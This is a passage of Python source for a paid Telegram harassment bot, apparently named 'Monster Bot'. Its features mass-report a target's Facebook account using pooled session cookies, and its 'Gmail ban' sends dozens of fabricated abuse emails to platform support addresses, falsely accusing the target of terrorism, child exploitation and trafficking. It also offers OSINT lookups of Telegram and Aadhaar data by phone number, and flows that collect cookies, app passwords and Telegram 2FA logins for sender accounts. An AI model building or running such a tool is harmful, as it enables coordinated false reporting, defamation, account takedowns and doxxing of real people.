        await status_msg.edit_text(f"✅ Instagram <b>{user}</b> linked!", parse_mode="HTML", reply_markup=admin_back_kb())
    else:
        await status_msg.edit_text(f"❌ Insta Login Failed:\n<code>{res}</code>", parse_mode="HTML", reply_markup=admin_back_kb())
    await state.clear()

@R.callback_query(F.data == "u:fb_ban")
async def cb_fb_ban(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not (is_premium(cq.from_user.id, d) or is_admin(cq.from_user.id, d)):
        return await cq.answer("💎 Premium required!", show_alert=True)
    if not d["fb_senders"]:
        return await cq.answer("⛔ No Facebook accounts linked!", show_alert=True)
    await state.set_state(S.fb_ban)
    await cq.message.edit_text("📘 <b>Facebook Ban</b>\n\nSend the target's profile URL or ID:", parse_mode="HTML", reply_markup=back_kb())

@R.message(S.fb_ban)
async def msg_fb_ban(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    target = msg.text.strip()
    await state.clear()
    d = load()
    senders = d["fb_senders"]
    status_msg = await msg.answer(f"💀 Firing Facebook reports on <code>{target}</code>...", parse_mode="HTML")
    def do_fb_report():
        ok, fail = 0, 0
        for acc in senders:
            try:
                cookies = acc["cookies"]
                headers = {"User-Agent": "Mozilla/5.0", "Cookie": cookies}
                payload = {"action": "report", "object_id": target, "reason": 1}
                r = requests.post("https://www.facebook.com/ajax/ufi/modify.php", data=payload, headers=headers, timeout=10)
                if r.status_code == 200: ok += 1
                else: fail += 1
                time.sleep(random.uniform(2, 4))
            except Exception as e:
                print(f"FB Error: {e}")
                fail += 1
        return ok, fail
    ok, fail = await asyncio.to_thread(do_fb_report)
    await status_msg.edit_text(f"✅ <b>FB Report Finished</b>\nTarget: {target}\nSuccess: {ok}\nFailed: {fail}", parse_mode="HTML")

@R.callback_query(F.data == "a:link_fb")
async def cb_link_fb(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.link_fb)
    await cq.message.edit_text("📘 Send Facebook cookies:\n<code>c_user=123456; xs=abcde...</code>", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.link_fb)
async def msg_link_fb(msg: Message, state: FSMContext):
    if not msg.text or "c_user=" not in msg.text: return await msg.answer("❌ Invalid cookies format.")
    d = load()
    d["fb_senders"].append({"cookies": msg.text.strip()})
    save(d)
    await msg.answer("✅ Facebook cookie linked!", reply_markup=admin_back_kb())
    await state.clear()OFFICIAL_EMAILS = [
    "support@instagram.com", "support@facebook.com", "support@whatsapp.com", 
    "support@telegram.org", "abuse@google.com"
]

REPORT_TEMPLATES = [
    "URGENT: Financial Fraud and Scam. I paid this user {target} for an account, they took my money and blocked me.",
    "URGENT: This account ({target}) is engaged in severe phishing and identity theft.",
    "URGENT: This user ({target}) is sending terrorist propaganda and extremist links.",
    "URGENT: This account ({target}) is hacking and stealing personal data.",
    "URGENT: This user ({target}) is selling illegal drugs and weapons on the platform.",
    "URGENT: This account ({target}) is a known scammer running fake investment schemes.",
    "URGENT: This user ({target}) is impersonating a government official to commit fraud.",
    "URGENT: This account ({target}) is distributing malicious malware and viruses.",
    "URGENT: This profile ({target}) is posting illegal and dangerous content.",
    "URGENT: This user ({target}) scammed me out of $500 and refuses to refund.",
    "URGENT: This account ({target}) is engaged in human trafficking networks.",
    "URGENT: This user ({target}) is harassing and blackmailing innocent people.",
    "URGENT: This profile ({target}) is selling stolen credit card information.",
    "URGENT: This account ({target}) is spreading fake news and causing public panic.",
    "URGENT: This user ({target}) is using automated bots to spam and scam users.",
    "URGENT: This account ({target}) is violating your terms of service with illegal activities.",
    "URGENT: This profile ({target}) is running a crypto scam and stealing funds.",
    "URGENT: This user ({target}) is involved in illegal money laundering.",
    "URGENT: This account ({target}) is threatening physical violence against me.",
    "URGENT: This user ({target}) is posting child exploitation materials.",
    "URGENT: This account ({target}) is engaged in severe copyright infringement.",
    "URGENT: This profile ({target}) is a fake account used for defamation.",
    "URGENT: This user ({target}) is selling counterfeit goods and illegal products.",
    "URGENT: This account ({target}) is engaged in cyberbullying and stalking.",
    "URGENT: This user ({target}) is part of an organized crime syndicate."
]

@R.callback_query(F.data == "u:gmail_ban")
async def cb_gmail_ban(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not (is_premium(cq.from_user.id, d) or is_admin(cq.from_user.id, d)):
        return await cq.answer("💎 Premium required!", show_alert=True)
    if not d["gmail_senders"]:
        return await cq.answer("⛔ No Gmail accounts linked!", show_alert=True)
    await state.set_state(S.gmail_ban)
    await cq.message.edit_text(
        "📧 <b>Gmail Ban (25-Template Abuse Engine)</b>\n\n"
        "Send the target's Gmail or Account ID.\n\n"
        "<i>The bot will fire 25 different high-severity reports to the official support emails.</i>", 
        parse_mode="HTML", reply_markup=back_kb())

@R.message(S.gmail_ban)
async def msg_gmail_ban(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    target = msg.text.strip()
    await state.clear()
    status_msg = await msg.answer(f"💀 Firing 25-Template Gmail Scam Reports on <code>{target}</code>...", parse_mode="HTML")
    ok, fail = await execute_gmail_report(target)
    await status_msg.edit_text(f"✅ <b>Gmail Report Done</b>\nTarget: {target}\nTotal Sent: {ok}\nFailed: {fail}", parse_mode="HTML", reply_markup=back_kb())

async def execute_gmail_report(target):
    d = load()
    senders = d["gmail_senders"]
    def do_report():
        ok, fail = 0, 0
        for acc in senders:
            for _ in range(25):
                template = random.choice(REPORT_TEMPLATES)
                body_text = template.format(target=target)
                dest = random.choice(OFFICIAL_EMAILS)
                try:
                    msg = MIMEText(body_text)
                    msg['Subject'] = f"URGENT ABUSE REPORT: {target}"
                    msg['From'] = acc["email"]
                    msg['To'] = dest
                    server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
                    server.login(acc["email"], acc["password"])
                    server.send_message(msg)
                    server.quit()
                    ok += 1
                    time.sleep(random.uniform(2, 5))
                except Exception as e:
                    print(f"Gmail Report Error to {dest}: {e}")
                    fail += 1
        return ok, fail
    return await asyncio.to_thread(do_report)

@R.callback_query(F.data == "a:link_gmail")
async def cb_link_gmail(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.link_gmail)
    await cq.message.edit_text(
        "📧 <b>Link Gmail Account</b>\n\n"
        "Send your Gmail address and <b>App Password</b>.\n"
        "Format: <code>email@gmail.com:app_password</code>", 
        parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.link_gmail)
async def msg_link_gmail(msg: Message, state: FSMContext):
    if not msg.text or ":" not in msg.text:
        return await msg.answer("❌ Invalid format. Use email@gmail.com:app_password")
    email, pwd = msg.text.split(":", 1)
    status_msg = await msg.answer("⏳ Verifying Gmail login...")
    def verify_gmail():
        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
            server.login(email.strip(), pwd.strip().replace(" ", ""))
            server.quit()
            return True, None
        except Exception as e:
            return False, str(e)
    success, err = await asyncio.to_thread(verify_gmail)
    if success:
        d = load()
        d["gmail_senders"].append({"email": email.strip(), "password": pwd.strip().replace(" ", "")})
        save(d)
        await status_msg.edit_text(f"✅ Gmail <b>{email}</b> linked successfully!", parse_mode="HTML", reply_markup=admin_back_kb())
    else:
        await status_msg.edit_text(f"❌ Gmail Login Failed:\n<code>{err}</code>", parse_mode="HTML", reply_markup=admin_back_kb())
    await state.clear()@R.callback_query(F.data == "u:osint")
async def cb_osint(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not (is_premium(cq.from_user.id, d) or is_admin(cq.from_user.id, d)):
        return await cq.answer("💎 Premium required!", show_alert=True)
    await state.set_state(S.osint)
    await cq.message.edit_text("🕵️ <b>OSINT Info</b>\n\nSend the target <b>Telegram ID</b> or <b>Phone Number</b> (+91...):", parse_mode="HTML", reply_markup=back_kb())

@R.message(S.osint)
async def msg_osint(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    target = msg.text.strip()
    await state.clear()
    status_msg = await msg.answer("⏳ Fetching OSINT data...")
    
    tg_info = "Not found"
    sessions = [f for f in os.listdir(SESSION_DIR) if f.endswith('.session')]
    if sessions:
        sess_path = os.path.join(SESSION_DIR, sessions[0])
        api_id, api_hash, _ = random.choice(API_POOL)
        client = TelegramClient(sess_path, api_id, api_hash)
        try:
            await client.connect()
            if target.isdigit():
                ent = await client.get_entity(int(target))
            else:
                ent = await client.get_entity(target)
            tg_info = f"Name: {ent.first_name} {ent.last_name or ''}\nUsername: @{ent.username or 'None'}\nBio: {ent.about or 'None'}\nID: {ent.id}"
            await client.disconnect()
        except Exception as e:
            tg_info = f"❌ Could not fetch TG data: {e}"
            await client.disconnect()
            
    d = load()
    api_url = d["config"].get("osint_api", "")
    external_info = "No external OSINT API configured in Admin Panel."
    if api_url:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{api_url}{target}") as r:
                    if r.status == 200:
                        external_info = await r.text()
                    else:
                        external_info = f"API Error: {r.status}"
        except Exception as e:
            external_info = f"API Connection Failed: {e}"
            
    await status_msg.edit_text(
        f"🕵️ <b>OSINT Result for {target}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 <b>Telegram Info:</b>\n<code>{tg_info}</code>\n\n"
        f"🪪 <b>Aadhaar/External Data:</b>\n<code>{external_info}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━", 
        parse_mode="HTML", reply_markup=back_kb()
  )@R.callback_query(F.data == "a:panel")
async def cb_admin(cq: CallbackQuery):
    if not is_admin(cq.from_user.id, load()): return await cq.answer("No access", show_alert=True)
    await cq.message.edit_text("🛡 <b>Admin Panel</b>", parse_mode="HTML", reply_markup=admin_kb())

@R.callback_query(F.data == "a:add_ch")
async def cb_add_ch(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_ch)
    await cq.message.edit_text("Send Channel Link:\n<code>https://t.me/trusteddealers_07</code>", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.add_ch)
async def msg_add_ch(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    d = load()
    try:
        username = msg.text.strip()
        if "t.me/" in username: username = username.split("t.me/")[1].split("/")[0]
        username = username.replace("@", "")
        chat = await bot.get_chat("@" + username)
        if any(c["id"] == chat.id for c in d["channels"]):
            await msg.answer("⚠️ Channel exists!", reply_markup=admin_back_kb()); await state.clear(); return
        d["channels"].append({"id": chat.id, "link": f"https://t.me/{username}", "title": chat.title})
        save(d)
        await msg.answer(f"✅ Added {chat.title}", reply_markup=admin_back_kb())
    except Exception as e: await msg.answer(f"❌ Error: {e}")
    await state.clear()

@R.callback_query(F.data == "a:rm_ch")
async def cb_rm_ch(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d): return
    if not d["channels"]: return await cq.answer("No channels.", show_alert=True)
    rows = [[btn(f"❌ {c['title']}", f"rmch_{c['id']}")] for c in d["channels"]]
    rows.append([btn("⬅ Back", "a:panel")])
    await cq.message.edit_text("Select channel to remove:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("rmch_"))
async def cb_rmch(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d): return
    cid = int(cq.data.split("_")[1])
    d["channels"] = [c for c in d["channels"] if c["id"] != cid]
    save(d)
    await cq.message.edit_text("✅ Channel removed.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:add_api")
async def cb_add_api(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_api)
    await cq.message.edit_text("Send API URL(s) line by line:", reply_markup=admin_back_kb())

@R.message(S.add_api)
async def msg_add_api(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    d = load(); added = 0
    for line in msg.text.split("\n"):
        u = line.strip()
        if u.startswith("http") and u not in d["api_urls"]:
            d["api_urls"].append(u); added += 1
    save(d); await state.clear()
    await msg.answer(f"✅ Added {added} API URLs.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:add_fb")
async def cb_add_fb(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_fb)
    await cq.message.edit_text("Send Firebase URL(s) line by line:", reply_markup=admin_back_kb())

@R.message(S.add_fb)
async def msg_add_fb(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    d = load(); added = 0
    for line in msg.text.split("\n"):
        u = line.strip().rstrip("/")
        if u.startswith("http") and u not in d["firebases"]:
            d["firebases"].append(u); added += 1
    save(d); await state.clear()
    await msg.answer(f"✅ Added {added} Firebase URLs.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:add_tg")
async def cb_add_tg(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_tg)
    await cq.message.edit_text("Send TG Report @username or ID:", reply_markup=admin_back_kb())

@R.message(S.add_tg)
async def msg_add_tg(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    d = load()
    if msg.text not in d["tg_reports"]: d["tg_reports"].append(msg.text); save(d)
    await state.clear()
    await msg.answer(f"✅ Added {msg.text}", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:add_wa")
async def cb_add_wa(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.wa_phone)
    await cq.message.edit_text("Send WA number for reporting:", reply_markup=admin_back_kb())

@R.message(S.wa_phone)
async def msg_add_wa(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    digits = "".join(c for c in msg.text if c.isdigit())
    if len(digits) < 10: return await msg.answer("Invalid number.")
    d = load()
    d["wa_reports"].append(digits); save(d)
    await state.clear()
    await msg.answer(f"✅ Saved.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:cfg_cost")
async def cb_cfg_cost(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.cfg_cost)
    await cq.message.edit_text("Send new SMS Cost:", reply_markup=admin_back_kb())

@R.message(S.cfg_cost)
async def msg_cfg_cost(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    d = load()
    try:
        d["config"]["sms_cost"] = int(msg.text); save(d)
        await msg.answer(f"✅ Cost set to {msg.text}.", reply_markup=admin_back_kb())
    except: await msg.answer("❌ Invalid.")
    await state.clear()

@R.callback_query(F.data == "a:cfg_osint")
async def cb_cfg_osint(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.cfg_osint)
    await cq.message.edit_text("Send OSINT API URL (e.g., https://api.osint.com/search?q=):\nOr 'clear':", reply_markup=admin_back_kb())

@R.message(S.cfg_osint)
async def msg_cfg_osint(msg: Message, state: FSMContext):
    d = load()
    if msg.text.lower() == "clear":
        d["config"]["osint_api"] = ""
    else:
        d["config"]["osint_api"] = msg.text.strip()
    save(d)
    await state.clear()
    await msg.answer("✅ OSINT API updated.", reply_markup=admin_back_kb())@R.callback_query(F.data == "a:add_cred")
async def cb_add_cred(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_cred)
    await cq.message.edit_text("Send: <code>user_id amount</code>", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.add_cred)
async def msg_add_cred(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    d = load()
    try:
        uid, amt = msg.text.split()
        if uid in d["users"]:
            d["users"][uid]["credits"] += int(amt); save(d)
            await msg.answer(f"✅ Added {amt} to {uid}.", reply_markup=admin_back_kb())
        else: await msg.answer("❌ Not found.")
    except: await msg.answer("❌ Format: ID AMOUNT")
    await state.clear()

@R.callback_query(F.data == "a:add_prem")
async def cb_add_prem(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.add_prem)
    await cq.message.edit_text("Send: <code>user_id days</code> (or 'perm')", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.add_prem)
async def msg_add_prem(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    d = load()
    try:
        uid, val = msg.text.split()
        if uid in d["users"]:
            d["users"][uid]["premium_until"] = "PERMANENT" if val.lower() == "perm" else int(time.time() + (int(val) * 86400)); save(d)
            await msg.answer(f"✅ Updated {uid}.", reply_markup=admin_back_kb())
        else: await msg.answer("❌ Not found.")
    except: await msg.answer("❌ Format: ID DAYS")
    await state.clear()

@R.callback_query(F.data == "a:broad")
async def cb_broad(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.broadcast)
    await cq.message.edit_text("Send broadcast message:", reply_markup=admin_back_kb())

@R.message(S.broadcast)
async def msg_broad(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    await state.clear(); d = load(); safe_text = html.escape(msg.text)
    status_msg = await msg.answer("📢 Broadcasting...")
    ok_u, fail_u = 0, 0
    for uid in d["users"]:
        try:
            await bot.send_message(int(uid), f"📢 <b>Broadcast:</b>\n\n{safe_text}", parse_mode="HTML")
            ok_u += 1; await asyncio.sleep(0.05)
        except: fail_u += 1
    ok_c, fail_c = 0, 0
    for ch in d["channels"]:
        try:
            await bot.send_message(ch["id"], f"📢 <b>Broadcast:</b>\n\n{safe_text}", parse_mode="HTML")
            ok_c += 1; await asyncio.sleep(0.05)
        except: fail_c += 1
    await status_msg.edit_text(f"✅ <b>Broadcast Done!</b>\nUsers: {ok_u} ok / {fail_u} failed\nChannels: {ok_c} ok / {fail_c} failed", parse_mode="HTML", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:add_adm")
async def cb_add_adm(cq: CallbackQuery, state: FSMContext):
    if cq.from_user.id != OWNER_ID: return await cq.answer("Owner only!", show_alert=True)
    await state.set_state(S.add_adm)
    await cq.message.edit_text("Send User ID:", reply_markup=admin_back_kb())

@R.message(S.add_adm)
async def msg_add_adm(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    d = load()
    try:
        uid = int(msg.text)
        if uid not in d["admins"]: d["admins"].append(uid); save(d)
        await msg.answer("✅ Admin Added.", reply_markup=admin_back_kb())
    except: await msg.answer("❌ Invalid ID.")
    await state.clear()

@R.callback_query(F.data == "a:rm_adm")
async def cb_rm_adm(cq: CallbackQuery):
    if cq.from_user.id != OWNER_ID: return await cq.answer("Owner only!", show_alert=True)
    d = load()
    if not d["admins"]: return await cq.answer("No admins.", show_alert=True)
    rows = [[btn(f"❌ {a}", f"rmadm_{a}")] for a in d["admins"]]
    rows.append([btn("⬅ Back", "a:panel")])
    await cq.message.edit_text("Remove admin:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("rmadm_"))
async def cb_rmadm(cq: CallbackQuery):
    if cq.from_user.id != OWNER_ID: return await cq.answer("Owner only!", show_alert=True)
    d = load(); uid = int(cq.data.split("_")[1])
    if uid in d["admins"]: d["admins"].remove(uid); save(d)
    await cq.message.edit_text("✅ Admin Removed.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:link_tg")
async def cb_link_tg(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    rows = [[btn(f"API {i+1}: {api[2]}", f"sel_tg_api_{i}")] for i, api in enumerate(API_POOL)]
    rows.append([btn("⬅ Back", "a:panel")])
    await cq.message.edit_text("📱 Select API for TG account:", parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("sel_tg_api_"))
async def cb_sel_tg_api(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    idx = int(cq.data.split("_")[3]); api_id, api_hash, label = API_POOL[idx]
    await state.update_data(api_id=api_id, api_hash=api_hash)
    await state.set_state(S.tg_phone)
    await cq.message.edit_text(f"✅ Selected: <b>{label}</b>\n\nSend phone number (e.g. +91...):", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.tg_phone)
async def msg_tg_phone(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    data = await state.get_data()
    api_id, api_hash = data.get("api_id"), data.get("api_hash")
    if not api_id or not api_hash: return await msg.answer("❌ Session lost.", reply_markup=admin_back_kb())
    ph = msg.text.strip().replace(" ", "")
    client = TelegramClient(f"sessions/{ph}", api_id, api_hash)
    await client.connect()
    try:
        sent = await client.send_code_request(ph)
        await state.update_data(ph=ph, hash=sent.phone_code_hash, c=client)
        await state.set_state(S.tg_code)
        await msg.answer("📨 Code sent. Enter code:", reply_markup=admin_back_kb())
    except Exception as e:
        await msg.answer(f"❌ Error: {e}"); await state.clear()

@R.message(S.tg_code)
async def msg_tg_code(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    data = await state.get_data(); client = data["c"]
    try:
        await client.sign_in(data["ph"], msg.text, phone_code_hash=data["hash"])
        await client.disconnect(); await state.clear()
        await msg.answer("✅ Linked!", reply_markup=admin_back_kb())
    except SessionPasswordNeededError:
        await state.set_state(S.tg_pass)
        await msg.answer("🔐 2FA Required. Send password:", reply_markup=admin_back_kb())
    except Exception as e:
        await msg.answer(f"❌ Error: {e}"); await state.clear()

@R.message(S.tg_pass)
async def msg_tg_pass(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    data = await state.get_data(); client = data["c"]
    try:
        await client.sign_in(password=msg.text)
        await client.disconnect(); await state.clear()
        await msg.answer("✅ Linked with 2FA!", reply_markup=admin_back_kb())
    except Exception as e:
        await msg.answer(f"❌ Error: {e}"); await state.clear()

@R.callback_query(F.data == "a:logout_wa")
async def cb_logout_wa(cq: CallbackQuery):
    if not is_admin(cq.from_user.id, load()): return
    d = load()
    if not d["wa_senders"]: return await cq.answer("No WA numbers linked.", show_alert=True)
    rows = [[btn(f"🗑 {num}", f"rmwa_{num}")] for num in d["wa_senders"]]
    rows.append([btn("⬅ Back", "a:panel")])
    await cq.message.edit_text("Select WA number to remove:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("rmwa_"))
async def cb_rmwa(cq: CallbackQuery):
    if not is_admin(cq.from_user.id, load()): return
    num = cq.data.split("_")[1]; d = load()
    if num in d["wa_senders"]: d["wa_senders"].remove(num); save(d)
    path = os.path.join(WA_SESSIONS_BASE, num)
    if os.path.exists(path): shutil.rmtree(path)
    await cq.message.edit_text(f"✅ Removed {num}.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:logout_social")
async def cb_logout_social(cq: CallbackQuery):
    if not is_admin(cq.from_user.id, load()): return
    d = load()
    d["insta_senders"] = []
    d["fb_senders"] = []
    d["gmail_senders"] = []
    save(d)
    await cq.message.edit_text("✅ All Insta/FB/Gmail accounts removed.", reply_markup=admin_back_kb())

@R.callback_query(F.data == "a:stats")
async def cb_stats(cq: CallbackQuery):
    d = load()
    sess = len([f for f in os.listdir(SESSION_DIR) if f.endswith('.session')])
    text = (f"📊 <b>Stats</b>\nUsers: {len(d['users'])}\nFirebase: {len(d['firebases'])}\nAPIs: {len(d['api_urls'])}\n"
            f"TG Sessions: {sess}\nWA Senders: {len(d['wa_senders'])}\nInsta Senders: {len(d['insta_senders'])}\nFB Senders: {len(d['fb_senders'])}\nGmail Senders: {len(d['gmail_senders'])}\nChannels: {len(d['channels'])}")
    await cq.message.edit_text(text, parse_mode="HTML", reply_markup=admin_back_kb())

async def main():
    print("[K] Monster Bot Starting...")
    if os.path.exists("package.json"):
        print("[K] Installing Node.js dependencies...")
        subprocess.run(["npm", "install"], capture_output=True)
        print("[K] Node.js dependencies installed!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
